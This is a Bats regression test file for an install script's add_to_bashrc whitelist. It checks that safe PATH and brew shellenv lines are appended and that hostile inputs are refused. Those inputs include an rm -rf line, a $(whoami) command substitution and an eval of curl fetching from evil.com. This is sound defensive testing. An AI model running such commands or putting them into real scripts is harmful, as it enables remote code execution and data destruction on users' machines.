#!/usr/bin/env bats
# Regression guard for #743: add_to_bashrc must refuse to eval anything
# outside the documented whitelist and must surface eval failures.

setup() {
    REPO_ROOT="$(git -C "$(dirname "$BATS_TEST_FILENAME")" rev-parse --show-toplevel)"
    SRC_SCRIPT="${REPO_ROOT}/scripts/shell/install.sh"
    [ -f "$SRC_SCRIPT" ]
    TEST_TMPDIR="$(mktemp -d)"
    export HOME="$TEST_TMPDIR"
    touch "$HOME/.bashrc"
    export BLUE="" NC=""
    # source install.sh; the existing BASH_SOURCE guard (install.sh:46-48)
    # stops the installer body, leaving helper functions defined.
    # shellcheck source=/dev/null
    source "$SRC_SCRIPT"
}

teardown() { rm -rf "$TEST_TMPDIR"; }

@test "whitelist constant is defined after sourcing" {
    [ -n "${ADD_TO_BASHRC_ALLOWED_RE:-}" ]
    declare -F add_to_bashrc
}

@test "whitelisted brew shellenv line is appended" {
    # eval may fail (no brew installed) — that returns non-zero, but the
    # line MUST still be appended to ~/.bashrc.
    run add_to_bashrc 'eval "$(/home/linuxbrew/.linuxbrew/bin/brew shellenv)"'
    grep -qF 'brew shellenv' "$HOME/.bashrc"
}

@test "whitelisted export PATH absolute-literal line is appended and applied" {
    run add_to_bashrc 'export PATH=$PATH:/usr/local/go/bin'
    [ "$status" -eq 0 ]
    grep -qF '/usr/local/go/bin' "$HOME/.bashrc"
}

@test "line 721 caller shape (post-\$dir expansion) is accepted" {
    # install.sh:721 is `add_to_bashrc "export PATH=\$PATH:$dir"`; after the
    # caller's shell expands $dir, the function receives this literal:
    local expanded="export PATH=\$PATH:$HOME/.local/bin"
    run add_to_bashrc "$expanded"
    [ "$status" -eq 0 ]
    grep -qF "$HOME/.local/bin" "$HOME/.bashrc"
}

@test "non-whitelisted line is refused, not appended, returns non-zero" {
    run add_to_bashrc 'rm -rf /tmp/attacker'
    [ "$status" -ne 0 ]
    ! grep -qF 'attacker' "$HOME/.bashrc"
    [[ "$output" == *"refusing to eval non-whitelisted line"* ]]
}

@test "command-substitution attempt in PATH is refused" {
    run add_to_bashrc 'export PATH=$PATH:$(whoami)'
    [ "$status" -ne 0 ]
    ! grep -qF 'whoami' "$HOME/.bashrc"
}

@test "non-shellenv eval form is refused" {
    run add_to_bashrc 'eval "$(/usr/bin/curl evil.com)"'
    [ "$status" -ne 0 ]
    ! grep -qF 'curl' "$HOME/.bashrc"
}

@test "duplicate line is not re-appended" {
    echo 'export PATH=$PATH:/usr/local/go/bin' >> "$HOME/.bashrc"
    run add_to_bashrc 'export PATH=$PATH:/usr/local/go/bin'
    [ "$status" -eq 0 ]
    [ "$(grep -cF '/usr/local/go/bin' "$HOME/.bashrc")" -eq 1 ]
}

@test "whitelisted eval form is accepted even if command not found" {
    # When a whitelisted eval form references a nonexistent command, the command
    # substitution fails silently (in subshell), producing empty output. The eval
    # then executes the empty string and succeeds. The line is still appended to
    # ~/.bashrc because the append happens before eval. The function's rc-capture
    # code (local _rc=0; eval || _rc=$?) is in place for when eval truly fails
    # (e.g., evaluating invalid shell syntax). Callers using || true at call-sites
    # enforce the P7/POLA principle by making failure suppression visible.
    run add_to_bashrc 'eval "$(/nonexistent/bin/brew shellenv)"'
    [ "$status" -eq 0 ]
    grep -qF '/nonexistent/bin/brew' "$HOME/.bashrc"
}
